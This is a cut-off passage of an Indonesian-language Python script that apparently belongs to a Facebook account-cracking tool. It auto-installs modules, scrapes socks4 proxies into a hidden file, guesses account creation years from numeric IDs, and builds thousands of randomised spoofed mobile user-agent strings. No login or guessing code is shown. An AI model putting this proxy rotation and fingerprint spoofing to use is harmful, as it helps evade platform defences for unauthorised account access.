#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#logika--tahun#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#------------------[ USER-AGENT ]-------------------#
uman,usman1=[],[]
pretty.install()
CON=sol()
#ugen2=[]
ugen2=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRAF-MKZ')
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
	a=random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'])
	b=random.choice(['0','1','2','3','4','5','6','7','8','9','10','11','12'])
	c=random.choice(['0','1','2','3','4','5','6','7','8','9','10'])
	d=random.choice(['0','1','2','3','4','5','6','7','8','9','10'])
	e=random.choice([' en-gb; GT-', ' en-us; GT-', ' en-us; SM-', ' en-gb; SM-', ' id-id; SM-', 'en-us; TEN-',' en-gb; ZET-'])
	f=random.randrange(10, 1000)
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(80,103)
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}.{c}.{d} {e}{f}{g}) {h}{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['XIAOMI POCO F1 Build/NMF26F)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX2202 Build/RKQ1.211119.001; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1,12)
	c='N151DL Build/SP1A.210812.016; wv'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(10,225)
	f='0'
	g=random.randrange(0,5000)
	h=random.randrange(0,225)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]'
	usus=f'{a} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(usus)
	
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.randrange(1,12)
	c='Nokia_X Build/JZO54K)'
	d='AppleWebKit/534.30 (KHTML, seperti Gecko) Versi/4.0 UCBrowser/'
	e=random.randrange(10,225)
	f='0'
	g=random.randrange(0,5000)
	h=random.randrange(0,225)
	i='Mobile Safari/534.30'
	usus=f'{a} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen2.append(usus)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['1.0', '2.0', '2.1', '2.2', '2.3', '3.0', '3.2.6', '4.0', '4.1', '4.2', '4.3', '4.4', '5.0', '5.1', '6.0', '7.0', '7.1', '7.1.2', '8.0', '8.1.0', '9'])
	c='0'
	d=random.choice(['en-us;', 'id-id;'])
	e=random.choice(['Redmi', 'Redmi Note'])
	f=random.randrange(2, 8)
	g=random.choice(['A Build/', 'Plus Build/', 'Pro Build/', 'Build/N2 Redmi 5A Build/'])
	h=random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	i=random.randrange(1, 999)
	j=random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	k=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) Chrome/', 'AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/', 'AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/'])
	l=random.randrange(85,104)
	m='0'
	n=random.randrange(149,5195)
	o=random.randrange(1,164)
	p=random.choice(['Mobile Safari/534.30', 'Mobile Safari/537.36','Safari/537.36','Iron Safari/537.36', 'Mobile Safari/E7FBAF', 'Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.5.6'])
	uaku2=f'{aa} {b}.{c}; {d} {e} {f}{g}{h}{i}{j} {k}{l}.{m}.{n}.{o} {p}'
	ugen2.append(uaku2)
	
	aa=random.choice(['Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0'])
	b='Gecko/48.0 Firefox/48.0'
	c='KAIOS/'
	d=random.randrange(1,9)
	e=random.randrange(1,9)
	f=random.randrange(1,9)
	g=random.randrange(1,9)
	uaku2=f'{aa}) {b} {c}{d}.{e}.{f}.{g}'
	ugen2.append(uaku2)
	
	aa=random.choice(['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android'])
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;'])
	c='zh-CN;'
	d=random.choice(['MZ-MEIZU_M5 ','MZ-MEIZU M6','MZ-U20','MZ-m2','MZ-MX6','MZ-Meizu M6s','MZ-M3s','MZ-U10'])
	dd='Build/MRA58K'
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(10,100)
	g='0'
	h=random.randrange(4200,5195)
	i=random.randrange(40,150)
	j=random.choice(['Mobile Safari/537.36 HeyTapBrowser/41.7.36.1','Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.5.6'])
	uaku2=f'{aa} {b} {c} {d} {dd}) {e}{f}.{g}.{h}.{i} {j}'
	ugen2.append(uaku2)
for xd in range(1900):
   aa='Mozilla/5.0 (Linux; U; Android'
   b=random.randrange(1, 9)
   c=random.randrange(1, 9)
   d=random.randrange(1, 9)
   dd=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   e=random.choice(['SM-J510FN','GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','G-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
   ee=random.choice(['Build/NMF26X','Build/JZO54K','Build/KOT49H','Build/LRX22C','Build/KRT16S','Build/KOT49E'])
   f=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'])
   g=random.randrange(73,100)
   h='0'
   i=random.randrange(4200,4900)
   j=random.randrange(40,150)
   k=random.choice(['Mobile Safari/537.36','YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mobile Safari/E7FBAF','Mobile Safari/537.36 PHX/11.8','Mobile Safari/537.36 (AirWatch Browser v22.12.1.5)','Mobile Safari/537.36 newsbreak/23.2.0'])
   uaku=(f'{aa} {b}.{c}.{d}; {dd} {e} {ee}) {f}{g}.{h}.{i}.{j} {k}')
   ugen2.append(uaku)

for xd in range(1950):
   aa='Mozilla/5.0 (Linux; U; Android'
   b=random.randrange(1, 9)
   c=random.randrange(1, 9)
   d=random.randrange(1, 9)
   dd=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   e=random.choice(['SM-E025F','SM-G996B','SM-A826S','SM-E135F','SM-G781B','SM-G998B','SM-F936U1','SM-G361F','SM-A716S','SM-J327AZ','SM-E426B','SM-A015F','SM-A015M','SM-A013G','SM-A013G','SM-A013M','SM-A013F','SM-A022M','SM-A022G','SM-A022F','SM-A025M','SM-S124DL','SM-A025U','SM-A025A','SM-A025G','SM-A025F','SM-A025AZ','SM-A035F','SM-A035M','SM-A035G','SM-A032F','SM-A032M','SM-A032F','SM-A037F','SM-A037U','SM-A037M','SM-S134DL','SM-A037G','SM-A105G','SM-A105M','SM-A105F','SM-A105FN','SM-A102U','SM-S102DL','SM-A102U1','SM-A107F','SM-A107M','SM-A115AZ','SM-A115U','SM-A115U1','SM-A115A','SM-A115M','SM-A115F','SM-A125F','SM-A127F','SM-A125M','SM-A125U','SM-A127M','SM-A135F','SM-A137F','SM-A135M','SM-A136U','SM-A136U1','SM-A136W','SM-A260F','SM-A260G','SM-A260F','SM-A260G','SM-A205GN','SM-A205U','SM-A205F','SM-A205G','SM-A205FN','SM-A202F','SM-A2070','SM-A207F','SM-A207M','SM-A215U','SM-A215U1','SM-A217F','SM-A217F','SM-A217M','SM-A225F','SM-A225M','SM-A226B','SM-A226B','SM-A226BR','SM-A235F','SM-A235M','SM-A300FU','SM-A300F','SM-A300H','SM-A310F','SM-A310M','SM-A320FL','SM-A320F','SM-A305G','SM-A305GT','SM-A305N','SM-A305F','SM-A307FN','SM-A307G','SM-A307GN','SM-A315G','SM-A315F','SM-A325F','SM-A325M','SM-A326U','SM-A326W','SM-A336E','SM-A336B','SM-A430F','SM-A405FN','SM-A405FM','SM-A3051','SM-A3050','SM-A415F','SM-A426U','SM-A426B','SM-A5009','SM-A500YZ','SM-A500Y','SM-A500W','SM-A500L','SM-A500X','SM-A500XZ','SM-A510F','SM-A510Y','SM-A520F','SM-A520W','SM-A500F','SM-A500FU','SM-A500H','SM-S506DL','SM-A505G','SM-A505FN','SM-A505U','SM-A505GN','SM-A505F','SM-A507FN','SM-A5070','SM-A515F','SM-A515U','SM-A515U1','SM-A516U','SM-A516V','SM-A516N','SM-A516B','SM-A525F','SM-A525M','SM-A526U','SM-A526U1','SM-A526B','SM-A526W','SM-A528B','SM-A536B','SM-A536U','SM-A536E','SM-A536V','SM-A600FN','SM-A600G','SM-A605FN','SM-A605G','SM-A605GN','SM-A605F','SM-A6050','SM-A606Y','SM-A6060','SM-G6200','SM-A700FD','SM-A700F','SM-A7000','SM-A700H','SM-A700YD','SM-A710F','SM-A710M','SM-A720F','SM-A750F','SM-A750FN','SM-A750GN','SM-A705FN','SM-A705F','SM-A705MN','SM-A707F','SM-A715F','SM-A715W','SM-A716U','SM-A716V','SM-A716U1','SM-A716B','SM-A725F','SM-A725M','SM-A736B','SM-A530F','SM-A810YZ','SM-A810F','SM-A810S','SM-A530W','SM-A530N','SM-G885F','SM-G885Y','SM-G885S','SM-A730F','SM-A805F','SM-G887F','SM-G8870','SM-A9000','SM-A920F','SM-A920F','SM-887N','SM-A910F','SM-G8850','SM-A908B','SM-A908N','SM-A9080','SM-G313HY','SM-G313MY','SM-G313MU','SM-G316M','SM-G316ML','SM-G316MY','SM-G313HZ','SM-G313H','SM-G313HU','SM-G313U','SM-G318H','SM-G357FZ','SM-G310HN','SM-G357FZ','SM-G850F','SM-G850M','SM-J337AZ','SM-G386T1','SM-G386T','SM-G3858','SM-G3858','SM-A226L','SM-C5000','SM-C500X','SM-C5010','SM-C5018','SM-C7000','SM-C7010','SM-C701F','SM-C7018','SM-C7100','SM-C7108','SM-C9000','SM-C900F','SM-C900Y','SM-G355H','SM-G355M','SM-G3589W','SM-G386W','SM-G386F','SM-G3518','SM-G3586V','SM-G5108Q','SM-G5108','SM-G3568V','SM-G350E','SM-G350','SM-G3509I','SM-G3508J','SM-G3502I','SM-G3502C','SM-S820L','SM-G360H','SM-G360F','SM-G360T','SM-G360M','SM-G361H','SM-E500H','SM-E500F','SM-E500M','SM-E5000','SM-E500YZ','SM-E700H','SM-E700F','SM-E7009','SM-E700M','SM-G3815','SM-G3815','SM-G3815','SM-F127G','SM-E225F','SM-E236B','SM-F415F','SM-E5260','SM-E625F','SM-F900U','SM-F907N','SM-F900F','SM-F9000','SM-F907B','SM-F900W','SM-G150NL','SM-G155S','SM-G1650','SM-W2015','SM-G7102','SM-G7105','SM-G7106','SM-G7108','SM-G7202','SM-G720N0','SM-G7200','SM-G720AX','SM-G530T1','SM-G530H','SM-G530FZ','SM-G531H','SM-G530BT','SM-G532F','SM-G531BT','SM-G531M','SM-J727AZ','SM-J100FN','SM-J100H','SM-J120FN','SM-J120H','SM-J120F','SM-J120M','SM-J111M','SM-J111F','SM-J110H','SM-J110G','SM-J110F','SM-J110M','SM-J105H','SM-J105Y','SM-J105B','SM-J106H','SM-J106F','SM-J106B','SM-J106M','SM-J200F','SM-J200M','SM-J200G','SM-J200H','SM-J200F','SM-J200GU','SM-J260M','SM-J260F','SM-J260MU','SM-J260F','SM-J260G','SM-J200BT','SM-G532G','SM-G532M','SM-G532MT','SM-J250M','SM-J250F','SM-J210F','SM-J260AZ','SM-J3109','SM-J320A','SM-J320G','SM-J320F','SM-J320H','SM-J320FN','SM-J330G','SM-J330F','SM-J330FN','SM-J337V','SM-J337P','SM-J337A','SM-J337VPP','SM-J337R4','SM-J327VPP','SM-J327V','SM-J327P','SM-J327R4','SM-S327VL','SM-S337TL','SM-S367VL','SM-J327A','SM-J327T1','SM-J327T','SM-J3110','SM-J3119S','SM-J3119','SM-S320VL','SM-J337T','SM-J400M','SM-J400F','SM-J400F','SM-J410F','SM-J410G','SM-J410F','SM-J415FN','SM-J415F','SM-J415G','SM-J415GN','SM-J415N','SM-J500FN','SM-J500M','SM-J510MN','SM-J510FN','SM-J510GN','SM-J530Y','SM-J530F','SM-J530G','SM-J530FM','SM-G570M','SM-G570F','SM-G570Y','SM-J600G','SM-J600FN','SM-J600GT','SM-J600F','SM-J610F','SM-J610G','SM-J610FN','SM-J710F','SM-J700H','SM-J700M','SM-J700F','SM-J700P','SM-J700T','SM-J710GN','SM-J700T1','SM-J727A','SM-J727R4','SM-J737T','SM-J737A','SM-J737R4','SM-J737V','SM-J737T1','SM-J737S','SM-J737P','SM-J737VPP','SM-J701F','SM-J701M','SM-J701MT','SM-S767VL','SM-S757BL','SM-J720F','SM-J720M','SM-G615F','SM-G615FU','SM-G610F',